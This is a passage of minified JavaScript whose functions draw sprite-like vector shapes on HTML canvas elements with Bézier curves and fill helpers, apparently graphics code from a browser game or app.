                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(133 * e, 179 * e),
                    n.bezierCurveTo(140 * e, 188.5 * e, 140 * e, 188.5 * e, 147 * e, 198 * e),
                    n.bezierCurveTo(148 * e, 209 * e, 142 * e, 214 * e, 133 * e, 214 * e),
                    n.bezierCurveTo(121 * e, 211 * e, 121 * e, 207 * e, 120 * e, 200 * e),
                    n.bezierCurveTo(126.5 * e, 189.5 * e, 126.5 * e, 189.5 * e, 133 * e, 179 * e),
                    n.closePath(),
                    he(n, t[8]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(133 * e, 143 * e),
                    n.bezierCurveTo(139 * e, 151.5 * e, 139 * e, 151.5 * e, 145 * e, 160 * e),
                    n.bezierCurveTo(143 * e, 167 * e, 140 * e, 170 * e, 134 * e, 170 * e),
                    n.bezierCurveTo(128 * e, 169 * e, 124 * e, 167 * e, 123 * e, 161 * e),
                    n.bezierCurveTo(128 * e, 152 * e, 128 * e, 152 * e, 133 * e, 143 * e),
                    n.closePath(),
                    he(n, t[8]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(133 * e, 115 * e),
                    n.bezierCurveTo(137.5 * e, 121.5 * e, 137.5 * e, 121.5 * e, 142 * e, 128 * e),
                    n.bezierCurveTo(141 * e, 133 * e, 138 * e, 135 * e, 133 * e, 135 * e),
                    n.bezierCurveTo(129 * e, 135 * e, 125 * e, 132 * e, 125 * e, 129 * e),
                    n.bezierCurveTo(129 * e, 122 * e, 129 * e, 122 * e, 133 * e, 115 * e),
                    n.closePath(),
                    he(n, t[8]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(133 * e, 94 * e),
                    n.bezierCurveTo(136.5 * e, 98.5 * e, 136.5 * e, 98.5 * e, 140 * e, 103 * e),
                    n.bezierCurveTo(139 * e, 109 * e, 137 * e, 109 * e, 133 * e, 110 * e),
                    n.bezierCurveTo(127 * e, 108 * e, 129 * e, 107 * e, 127 * e, 105 * e),
                    n.bezierCurveTo(130 * e, 99.5 * e, 130 * e, 99.5 * e, 133 * e, 94 * e),
                    n.closePath(),
                    he(n, t[8]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(130 * e, 279 * e),
                    n.bezierCurveTo(136.5 * e, 287.5 * e, 136.5 * e, 287.5 * e, 143 * e, 296 * e),
                    n.bezierCurveTo(143 * e, 302 * e, 139 * e, 309 * e, 131 * e, 308 * e),
                    n.bezierCurveTo(123 * e, 306 * e, 121 * e, 303 * e, 120 * e, 297 * e),
                    n.bezierCurveTo(125.5 * e, 288.5 * e, 125.5 * e, 288.5 * e, 131 * e, 280 * e),
                    n.closePath(),
                    he(n, t[8]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(147 * e, 303 * e),
                    n.bezierCurveTo(151 * e, 311 * e, 151 * e, 319 * e, 147 * e, 321 * e),
                    n.bezierCurveTo(138 * e, 320 * e, 145 * e, 308 * e, 147 * e, 303 * e),
                    n.closePath(),
                    he(n, t[8]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(115 * e, 303 * e),
                    n.bezierCurveTo(115 * e, 312 * e, 118 * e, 319 * e, 115 * e, 319 * e),
                    n.bezierCurveTo(112 * e, 324 * e, 109 * e, 318 * e, 109 * e, 314 * e),
                    n.bezierCurveTo(109 * e, 308 * e, 112 * e, 303 * e, 115 * e, 303 * e),
                    n.closePath(),
                    he(n, t[8]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(89 * e, 280 * e),
                    n.bezierCurveTo(83 * e, 279 * e, 80 * e, 281 * e, 81 * e, 286 * e),
                    n.bezierCurveTo(83 * e, 290 * e, 84 * e, 290 * e, 87 * e, 286 * e),
                    n.closePath(),
                    he(n, t[8]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(94 * e, 290 * e),
                    n.bezierCurveTo(93 * e, 294 * e, 90 * e, 303 * e, 86 * e, 298 * e),
                    n.bezierCurveTo(84 * e, 295 * e, 84 * e, 291 * e, 89 * e, 291 * e),
                    n.closePath(),
                    he(n, t[8]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(163 * e, 295 * e),
                    n.bezierCurveTo(175 * e, 294 * e, 176 * e, 296 * e, 175 * e, 301 * e),
                    n.bezierCurveTo(174 * e, 305 * e, 171 * e, 305 * e, 166 * e, 300 * e),
                    n.closePath(),
                    he(n, t[8]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(172 * e, 286 * e),
                    n.bezierCurveTo(180 * e, 285 * e, 181 * e, 285 * e, 180 * e, 291 * e),
                    n.bezierCurveTo(176 * e, 295 * e, 174 * e, 294 * e, 172 * e, 286 * e),
                    n.closePath(),
                    he(n, t[8]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(115 * e, 37 * e),
                    n.bezierCurveTo(116 * e, 28 * e, 119 * e, 27 * e, 126 * e, 37 * e),
                    n.bezierCurveTo(134 * e, 48 * e, 134 * e, 49 * e, 132 * e, 59 * e),
                    n.bezierCurveTo(131 * e, 67 * e, 127 * e, 65 * e, 120 * e, 56 * e),
                    n.bezierCurveTo(114 * e, 49 * e, 113 * e, 43 * e, 115 * e, 38 * e),
                    n.closePath(),
                    he(n, t[7]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(146 * e, 34 * e),
                    n.bezierCurveTo(152 * e, 28 * e, 155 * e, 27 * e, 157 * e, 39 * e),
                    n.bezierCurveTo(157 * e, 45 * e, 157 * e, 49 * e, 150 * e, 56 * e),
                    n.bezierCurveTo(141 * e, 66 * e, 138 * e, 66 * e, 138 * e, 57 * e),
                    n.bezierCurveTo(137 * e, 50 * e, 137 * e, 47 * e, 141 * e, 42 * e),
                    n.closePath(),
                    he(n, t[7]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(143 * e, 69 * e),
                    n.bezierCurveTo(148 * e, 56 * e, 156 * e, 50 * e, 158 * e, 58 * e),
                    n.bezierCurveTo(159 * e, 64 * e, 160 * e, 67 * e, 153 * e, 77 * e),
                    n.bezierCurveTo(148 * e, 83 * e, 145 * e, 84 * e, 143 * e, 77 * e),
                    n.closePath(),
                    he(n, t[7]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(149 * e, 92 * e),
                    n.bezierCurveTo(149 * e, 89 * e, 151 * e, 84 * e, 156 * e, 79 * e),
                    n.bezierCurveTo(161 * e, 73 * e, 163 * e, 78 * e, 162 * e, 86 * e),
                    n.bezierCurveTo(161 * e, 91 * e, 155 * e, 99 * e, 152 * e, 98 * e),
                    n.closePath(),
                    he(n, t[7]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(111 * e, 61 * e),
                    n.bezierCurveTo(114 * e, 51 * e, 117 * e, 51 * e, 124 * e, 64 * e),
                    n.bezierCurveTo(128 * e, 68 * e, 128 * e, 76 * e, 126 * e, 79 * e),
                    n.bezierCurveTo(123 * e, 84 * e, 122 * e, 82 * e, 115 * e, 74 * e),
                    n.bezierCurveTo(112 * e, 67 * e, 115 * e, 74 * e, 115 * e, 74 * e),
                    n.bezierCurveTo(111 * e, 68 * e, 111 * e, 66 * e, 111 * e, 62 * e),
                    n.closePath(),
                    he(n, t[7]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(107 * e, 81 * e),
                    n.bezierCurveTo(108 * e, 74 * e, 112 * e, 73 * e, 118 * e, 84 * e),
                    n.bezierCurveTo(122 * e, 88 * e, 122 * e, 93 * e, 121 * e, 98 * e),
                    n.bezierCurveTo(114 * e, 98 * e, 113 * e, 98 * e, 109 * e, 90 * e),
                    n.bezierCurveTo(107 * e, 87 * e, 106 * e, 85 * e, 107 * e, 82 * e),
                    n.closePath(),
                    he(n, t[7]),
                    i
            }
            function vi(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 85 * e,
                    i.height = 145 * e,
                    n.translate(-20 * e, -95 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(50 * e, 105 * e),
                    n.bezierCurveTo(52 * e, 119 * e, 64 * e, 137 * e, 71 * e, 146 * e),
                    n.bezierCurveTo(71 * e, 161 * e, 74 * e, 169 * e, 79 * e, 179 * e),
                    n.bezierCurveTo(68 * e, 192 * e, 70 * e, 204 * e, 69 * e, 216 * e),
                    n.bezierCurveTo(50 * e, 189.5 * e, 50 * e, 189.5 * e, 31 * e, 163 * e),
                    n.closePath(),
                    he(n, t[1]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(44 * e, 106 * e),
                    n.bezierCurveTo(49 * e, 90 * e, 58 * e, 104 * e, 51 * e, 121 * e),
                    n.bezierCurveTo(45 * e, 143 * e, 41 * e, 151 * e, 37 * e, 162 * e),
                    n.bezierCurveTo(48 * e, 180 * e, 58 * e, 188 * e, 76 * e, 205 * e),
                    n.bezierCurveTo(104 * e, 209 * e, 105 * e, 229 * e, 92 * e, 235 * e),
                    n.bezierCurveTo(76 * e, 239 * e, 75 * e, 232 * e, 56 * e, 213 * e),
                    n.bezierCurveTo(31 * e, 187 * e, 28 * e, 176 * e, 23 * e, 162 * e),
                    n.bezierCurveTo(38 * e, 131 * e, 40 * e, 120 * e, 44 * e, 106 * e),
                    n.closePath(),
                    he(n, t[2], t[3], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(30 * e, 159 * e),
                    n.bezierCurveTo(46 * e, 157 * e, 59 * e, 152 * e, 68 * e, 148 * e),
                    n.bezierCurveTo(63 * e, 155 * e, 52 * e, 160 * e, 44 * e, 164 * e),
                    n.bezierCurveTo(59 * e, 169 * e, 66 * e, 174 * e, 75 * e, 178 * e),
                    n.bezierCurveTo(58 * e, 178 * e, 49 * e, 175 * e, 37 * e, 174 * e),
                    n.closePath(),
                    he(n, t[2]),
                    i
            }
            function Mi(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 85 * e,
                    i.height = 145 * e,
                    n.translate(-165 * e, -95 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(217 * e, 103 * e),
                    n.bezierCurveTo(209 * e, 129 * e, 203 * e, 137 * e, 195 * e, 146 * e),
                    n.bezierCurveTo(195 * e, 159 * e, 194 * e, 167 * e, 189 * e, 178 * e),
                    n.bezierCurveTo(193 * e, 186 * e, 196 * e, 195 * e, 198 * e, 216 * e),
                    n.bezierCurveTo(217.5 * e, 189.5 * e, 217.5 * e, 189.5 * e, 237 * e, 163 * e),
                    n.closePath(),
                    he(n, t[1]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(231 * e, 163 * e),
                    n.bezierCurveTo(221 * e, 139 * e, 218 * e, 128 * e, 215 * e, 114 * e),
                    n.bezierCurveTo(213 * e, 102 * e, 220 * e, 92 * e, 222 * e, 107 * e),
                    n.bezierCurveTo(224 * e, 118 * e, 233 * e, 138 * e, 244 * e, 161 * e),
                    n.bezierCurveTo(235 * e, 188 * e, 224 * e, 198 * e, 204 * e, 221 * e),
                    n.bezierCurveTo(190 * e, 233 * e, 190 * e, 235 * e, 180 * e, 235 * e),
                    n.bezierCurveTo(167 * e, 235 * e, 164 * e, 216 * e, 175 * e, 211 * e),
                    n.bezierCurveTo(176 * e, 208 * e, 181 * e, 207 * e, 191 * e, 205 * e),
                    n.bezierCurveTo(213 * e, 186 * e, 218 * e, 180 * e, 230 * e, 163 * e),
                    n.closePath(),
                    he(n, t[2], t[3], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(234 * e, 154 * e),
                    n.bezierCurveTo(227 * e, 156 * e, 222 * e, 156 * e, 199 * e, 148 * e),
                    n.bezierCurveTo(201 * e, 151 * e, 216 * e, 159 * e, 224 * e, 162 * e),
                    n.bezierCurveTo(209 * e, 169.5 * e, 209 * e, 169.5 * e, 194 * e, 177 * e),
                    n.bezierCurveTo(213.5 * e, 175 * e, 213.5 * e, 175 * e, 233 * e, 173 * e),
                    n.closePath(),
                    he(n, t[2]),
                    i
            }
            function fi(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 187 * e,
                    n.height = 119 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.translate(0, 3),
                    r.moveTo(53 * e, 45 * e),
                    r.bezierCurveTo(3 * e, 60 * e, 11 * e, 72 * e, 19 * e, 81 * e),
                    r.bezierCurveTo(28 * e, 82 * e, 24 * e, 81 * e, 29 * e, 82 * e),
                    r.bezierCurveTo(26 * e, 87 * e, 28 * e, 84 * e, 28 * e, 87 * e),
                    r.bezierCurveTo(63 * e, 101 * e, 92 * e, 100 * e, 138 * e, 93 * e),
                    r.bezierCurveTo(172 * e, 87 * e, 180 * e, 72 * e, 168 * e, 62 * e),
                    r.bezierCurveTo(154 * e, 51 * e, 150 * e, 50 * e, 148 * e, 49 * e),
                    r.bezierCurveTo(132 * e, 42 * e, 90 * e, 40 * e, 55 * e, 45 * e),
                    r.closePath(),
                    he(r, i[5]),
                    r.globalAlpha = 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.translate(0, -3),
                    r.moveTo(53 * e, 45 * e),
                    r.bezierCurveTo(3 * e, 60 * e, 11 * e, 72 * e, 19 * e, 81 * e),
                    r.bezierCurveTo(28 * e, 82 * e, 24 * e, 81 * e, 29 * e, 82 * e),
                    r.bezierCurveTo(26 * e, 87 * e, 28 * e, 84 * e, 28 * e, 87 * e),
                    r.bezierCurveTo(63 * e, 101 * e, 92 * e, 100 * e, 138 * e, 93 * e),
                    r.bezierCurveTo(172 * e, 87 * e, 180 * e, 72 * e, 168 * e, 62 * e),
                    r.bezierCurveTo(154 * e, 51 * e, 150 * e, 50 * e, 148 * e, 49 * e),
                    r.bezierCurveTo(132 * e, 42 * e, 90 * e, 40 * e, 55 * e, 45 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(151 * e, 60 * e),
                    r.bezierCurveTo(140 * e, 36 * e, 137 * e, 32 * e, 124 * e, 29 * e),
                    r.bezierCurveTo(98 * e, 22 * e, 80 * e, 24 * e, 62 * e, 28 * e),
                    r.bezierCurveTo(42 * e, 35 * e, 38 * e, 46 * e, 34 * e, 58 * e),
                    r.bezierCurveTo(53 * e, 74 * e, 76 * e, 76 * e, 91 * e, 78 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(37 * e, 53 * e),
                    r.bezierCurveTo(30 * e, 56 * e, 29 * e, 67 * e, 30 * e, 68 * e),
                    r.bezierCurveTo(94 * e, 108 * e, 150 * e, 76 * e, 155 * e, 70 * e),
                    r.bezierCurveTo(154 * e, 60 * e, 151 * e, 54 * e, 149 * e, 53 * e),
                    r.bezierCurveTo(101 * e, 74 * e, 66 * e, 66 * e, 37 * e, 53 * e),
                    r.closePath(),
                    he(r, i[2], i[3], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(100 * e, 36 * e),
                    r.bezierCurveTo(92 * e, 25 * e, 86 * e, 28 * e, 82 * e, 34 * e),
                    r.bezierCurveTo(88 * e, 40 * e, 93 * e, 40 * e, 98 * e, 36 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(80 * e, 43 * e),
                    r.bezierCurveTo(69 * e, 46 * e, 67 * e, 52 * e, 69 * e, 58 * e),
                    he(r, void 0, i[1], 4 * e),
                    ke(r, 58 * e, 50 * e, 5 * e),
                    he(r, i[4]),
                    ke(r, 43 * e, 65 * e, 5 * e),
                    he(r, i[4]),
                    ke(r, 58 * e, 73 * e, 5 * e),
                    he(r, i[4]),
                    ke(r, 58 * e, 50 * e, 2 * e),
                    he(r, i[5]),
                    ke(r, 43 * e, 65 * e, 2 * e),
                    he(r, i[5]),
                    ke(r, 58 * e, 73 * e, 2 * e),
                    he(r, i[5]),
                    n
            }
            function Li(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 180 * e,
                    n.height = 120 * e,
                    r.translate(-65 * e, -35 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(0, 10 * e),
                    r.save(),
                    r.translate(150.5 * e, 63.84375 * e),
                    Ve(r, -67 * e, -16.5 * e, 134 * e, 33 * e, 5 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(80.5 * e, 75.34375 * e),
                    r.bezierCurveTo(83 * e, 106.34375 * e, 83 * e, 106.34375 * e, 85.5 * e, 137.34375 * e),
                    r.bezierCurveTo(93 * e, 135.84375 * e, 93 * e, 135.84375 * e, 100.5 * e, 134.34375 * e),
                    r.bezierCurveTo(99.5 * e, 100.84375 * e, 99.5 * e, 100.84375 * e, 98.5 * e, 67.34375 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(206.5 * e, 71.34375 * e),
                    r.bezierCurveTo(203.5 * e, 104.34375 * e, 203.5 * e, 104.34375 * e, 200.5 * e, 137.34375 * e),
                    r.bezierCurveTo(208.5 * e, 137.34375 * e, 208.5 * e, 137.34375 * e, 216.5 * e, 137.34375 * e),
                    r.bezierCurveTo(219 * e, 102.84375 * e, 219 * e, 102.84375 * e, 221.5 * e, 68.34375 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(136.5 * e, 75.34375 * e),
                    r.bezierCurveTo(139 * e, 94.34375 * e, 139 * e, 94.34375 * e, 141.5 * e, 113.34375 * e),
                    r.bezierCurveTo(149.5 * e, 115.34375 * e, 149.5 * e, 115.34375 * e, 157.5 * e, 117.34375 * e),
                    r.bezierCurveTo(162 * e, 97.34375 * e, 162 * e, 97.34375 * e, 166.5 * e, 77.34375 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.save(),
                    r.translate(152.5 * e, 80.84375 * e),
                    r.rotate(3.12),
                    Ve(r, -73 * e, -20.5 * e, 146 * e, 41 * e, 5 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(0, -10 * e),
                    r.save(),
                    r.translate(150.5 * e, 63.84375 * e),
                    Ve(r, -67 * e, -16.5 * e, 134 * e, 33 * e, 5 * e),
                    r.restore(),
                    he(r, i[1], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(80.5 * e, 75.34375 * e),
                    r.bezierCurveTo(83 * e, 106.34375 * e, 83 * e, 106.34375 * e, 85.5 * e, 137.34375 * e),
                    r.bezierCurveTo(93 * e, 135.84375 * e, 93 * e, 135.84375 * e, 100.5 * e, 134.34375 * e),
                    r.bezierCurveTo(99.5 * e, 100.84375 * e, 99.5 * e, 100.84375 * e, 98.5 * e, 67.34375 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(206.5 * e, 71.34375 * e),
                    r.bezierCurveTo(203.5 * e, 104.34375 * e, 203.5 * e, 104.34375 * e, 200.5 * e, 137.34375 * e),
                    r.bezierCurveTo(208.5 * e, 137.34375 * e, 208.5 * e, 137.34375 * e, 216.5 * e, 137.34375 * e),
                    r.bezierCurveTo(219 * e, 102.84375 * e, 219 * e, 102.84375 * e, 221.5 * e, 68.34375 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(136.5 * e, 75.34375 * e),
                    r.bezierCurveTo(139 * e, 94.34375 * e, 139 * e, 94.34375 * e, 141.5 * e, 113.34375 * e),
                    r.bezierCurveTo(149.5 * e, 115.34375 * e, 149.5 * e, 115.34375 * e, 157.5 * e, 117.34375 * e),
                    r.bezierCurveTo(162 * e, 97.34375 * e, 162 * e, 97.34375 * e, 166.5 * e, 77.34375 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 4 * e),
                    r.save(),
                    r.translate(152.5 * e, 80.84375 * e),
                    r.rotate(3.12),
                    Ve(r, -73 * e, -20.5 * e, 146 * e, 41 * e, 5 * e),
                    r.restore(),
                    he(r, i[1], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(83.5 * e, 73.34375 * e),
                    r.bezierCurveTo(93.5 * e, 70.34375 * e, 105.5 * e, 70.34375 * e, 124.5 * e, 72.34375 * e),
                    r.bezierCurveTo(132.5 * e, 78.34375 * e, 162.5 * e, 80.34375 * e, 176.5 * e, 76.34375 * e),
                    r.bezierCurveTo(194.5 * e, 69.34375 * e, 192.5 * e, 68.34375 * e, 199.5 * e, 63.34375 * e),
                    r.bezierCurveTo(204.5 * e, 63.34375 * e, 204.5 * e, 63.34375 * e, 209.5 * e, 63.34375 * e),
                    r.bezierCurveTo(153.5 * e, 82.34375 * e, 157.5 * e, 85.34375 * e, 209.5 * e, 63.34375 * e),
                    r.bezierCurveTo(194.5 * e, 88.34375 * e, 162.5 * e, 87.34375 * e, 149.5 * e, 88.34375 * e),
                    r.bezierCurveTo(129.5 * e, 81.34375 * e, 103.5 * e, 75.34375 * e, 83.5 * e, 82.34375 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(137.5 * e, 65.34375 * e),
                    r.bezierCurveTo(150.5 * e, 76.34375 * e, 170.5 * e, 71.34375 * e, 174.5 * e, 65.34375 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(221.5 * e, 85.34375 * e),
                    r.bezierCurveTo(211.5 * e, 79.34375 * e, 191.5 * e, 88.34375 * e, 181.5 * e, 96.34375 * e),
                    r.bezierCurveTo(201.5 * e, 96.34375 * e, 201.5 * e, 96.34375 * e, 221.5 * e, 96.34375 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(84.5 * e, 89.34375 * e),
                    r.bezierCurveTo(102.5 * e, 87.34375 * e, 112.5 * e, 88.34375 * e, 119.5 * e, 97.34375 * e),
                    r.bezierCurveTo(102 * e, 98.34375 * e, 102 * e, 98.34375 * e, 84.5 * e, 99.34375 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(208.5 * e, 104.34375 * e),
                    r.bezierCurveTo(208.5 * e, 110.34375 * e, 208.5 * e, 110.34375 * e, 208.5 * e, 116.34375 * e),
                    r.bezierCurveTo(211.5 * e, 110.34375 * e, 211.5 * e, 110.34375 * e, 214.5 * e, 104.34375 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(87.5 * e, 117.34375 * e),
                    r.bezierCurveTo(92 * e, 118.84375 * e, 92 * e, 118.84375 * e, 96.5 * e, 120.34375 * e),
                    r.bezierCurveTo(93 * e, 123.84375 * e, 93 * e, 123.84375 * e, 89.5 * e, 127.34375 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(107.5 * e, 51.34375 * e),
                    r.bezierCurveTo(122.5 * e, 54.34375 * e, 122.5 * e, 54.34375 * e, 137.5 * e, 57.34375 * e),
                    r.bezierCurveTo(118 * e, 57.34375 * e, 118 * e, 57.34375 * e, 98.5 * e, 57.34375 * e),
                    r.bezierCurveTo(94.5 * e, 54.84375 * e, 94.5 * e, 54.84375 * e, 90.5 * e, 52.34375 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(170.5 * e, 52.34375 * e),
                    r.bezierCurveTo(179.5 * e, 51.84375 * e, 179.5 * e, 51.84375 * e, 188.5 * e, 51.34375 * e),
                    r.bezierCurveTo(187.5 * e, 53.84375 * e, 187.5 * e, 53.84375 * e, 186.5 * e, 56.34375 * e),
                    r.bezierCurveTo(177 * e, 56.34375 * e, 177 * e, 56.34375 * e, 167.5 * e, 56.34375 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(80.5 * e, 69.34375 * e),
                    r.bezierCurveTo(86.5 * e, 70.34375 * e, 86.5 * e, 70.34375 * e, 92.5 * e, 71.34375 * e),
                    r.bezierCurveTo(86 * e, 73.34375 * e, 86 * e, 73.34375 * e, 79.5 * e, 75.34375 * e),
                    r.closePath(),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(222.5 * e, 75.34375 * e),
                    r.bezierCurveTo(214.5 * e, 76.34375 * e, 214.5 * e, 76.34375 * e, 206.5 * e, 77.34375 * e),
                    r.bezierCurveTo(216.5 * e, 79.34375 * e, 216.5 * e, 79.34375 * e, 226.5 * e, 81.34375 * e),
                    r.closePath(),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(116.5 * e, 100.34375 * e),
                    r.bezierCurveTo(128 * e, 97.34375 * e, 128 * e, 97.34375 * e, 139.5 * e, 94.34375 * e),
                    r.bezierCurveTo(140 * e, 96.84375 * e, 140 * e, 96.84375 * e, 140.5 * e, 99.34375 * e),
                    r.closePath(),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(112.5 * e, 48.34375 * e),
                    r.bezierCurveTo(115.5 * e, 50.84375 * e, 115.5 * e, 50.84375 * e, 118.5 * e, 53.34375 * e),
                    r.bezierCurveTo(131 * e, 50.84375 * e, 131 * e, 50.84375 * e, 143.5 * e, 48.34375 * e),
                    r.closePath(),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(216.5 * e, 109.34375 * e),
                    r.bezierCurveTo(213 * e, 114.84375 * e, 213 * e, 114.84375 * e, 209.5 * e, 120.34375 * e),
                    r.bezierCurveTo(212 * e, 118.84375 * e, 212 * e, 118.84375 * e, 214.5 * e, 117.34375 * e),
                    r.closePath(),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(86.5 * e, 133.34375 * e),
                    r.bezierCurveTo(89 * e, 127.34375 * e, 89 * e, 127.34375 * e, 91.5 * e, 121.34375 * e),
                    r.bezierCurveTo(92.5 * e, 127.34375 * e, 92.5 * e, 127.34375 * e, 93.5 * e, 133.34375 * e),
                    r.closePath(),
                    he(r, i[2]),
                    n
            }
            function Gi(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 175 * e,
                    n.height = 106 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(0, 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(28 * e, 67 * e),
                    r.bezierCurveTo(55 * e, 80 * e, 126 * e, 74 * e, 144 * e, 68 * e),
                    r.bezierCurveTo(144.5 * e, 75 * e, 144.5 * e, 75 * e, 145 * e, 82 * e),
                    r.bezierCurveTo(114 * e, 94 * e, 47 * e, 91 * e, 28 * e, 82 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(0, -8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(145 * e, 75 * e),
                    r.bezierCurveTo(143 * e, 51 * e, 133 * e, 29 * e, 100 * e, 27 * e),
                    r.bezierCurveTo(52 * e, 21 * e, 37 * e, 37 * e, 31 * e, 54 * e),
                    r.bezierCurveTo(23 * e, 78 * e, 28 * e, 77 * e, 36 * e, 79 * e),
                    r.bezierCurveTo(80 * e, 87 * e, 120 * e, 81 * e, 145 * e, 76 * e),
                    r.closePath(),
                    he(r, i[1]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(38 * e, 46 * e),
                    r.bezierCurveTo(52 * e, 37 * e, 69 * e, 36 * e, 85 * e, 36 * e),
                    r.bezierCurveTo(118 * e, 38 * e, 129 * e, 42 * e, 137 * e, 48 * e),
                    r.bezierCurveTo(135 * e, 45 * e, 135 * e, 45 * e, 133 * e, 42 * e),
                    r.bezierCurveTo(124 * e, 32 * e, 116 * e, 28 * e, 88 * e, 25 * e),
